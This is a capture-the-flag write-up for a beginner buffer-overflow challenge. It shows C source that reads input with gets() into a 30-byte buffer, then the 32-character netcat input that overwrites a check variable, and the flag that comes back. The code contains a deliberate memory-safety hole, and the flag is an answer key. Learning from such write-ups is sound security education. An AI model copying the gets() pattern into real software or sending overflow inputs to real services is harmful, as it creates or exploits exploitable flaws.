# Go With the Overflow

## Pwn

### Pwn is easy if you go with the (over) flow.

This challenge came with a binary and the source code.

**Source**
```C
#include <stdio.h>
#include <stdlib.h>

#pragma GCC diagnostic ignored "-Wimplicit-function-declaration"

char buffer[30];
int blah;
FILE *fptr;
char daflag[50];

int main() {
	blah = 1337;
	printf("\n\nAre you able to go with the (over) flow?\n");
	printf("What's your favorite word? ");
	fflush(stdout);
	gets(buffer);
	if (blah == 1337){
		printf("\nYou didn't get into the flow\n");
		fflush(stdout);
	}else{
		printf("\nNice job, going with the flow\n");
		fptr = fopen("./flag.txt", "r");
		fgets(daflag, 46, fptr);
		fclose(fptr);
		printf("Let your flag flow: %s\n\n", daflag);
		fflush(stdout);
	}
	return 0;
}
```

Reviewing the source code, the first thing that pops out is that it uses `gets` to collect user input.  This is extremely dangerous, if you don't believe me read the `gets` man page.  The buffer has space allocated for 30 characters.  If the user adds more than that, it will start overwriting the stack.  
The next thing that catches my attention is that it sets a variable to 1337 and after the user input it checks if that is still the case.  If it is, no flag.  If it's not you get the flag.  This is a relatively easy buffer overflow.  We need to add enough characters (32) in the input to overflow the buffer and overwrite the `blah` variable.


```sh
% nc 98.88.89.199 2228

Are you able to go with the (over) flow?
What's your favorite word? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Nice job, going with the flow
Let your flag flow: teractf{th3_fl0w_15_0v3r_turn_0ut_th3_l1ght5}
```

**teractf{th3_fl0w_15_0v3r_turn_0ut_th3_l1ght5}**
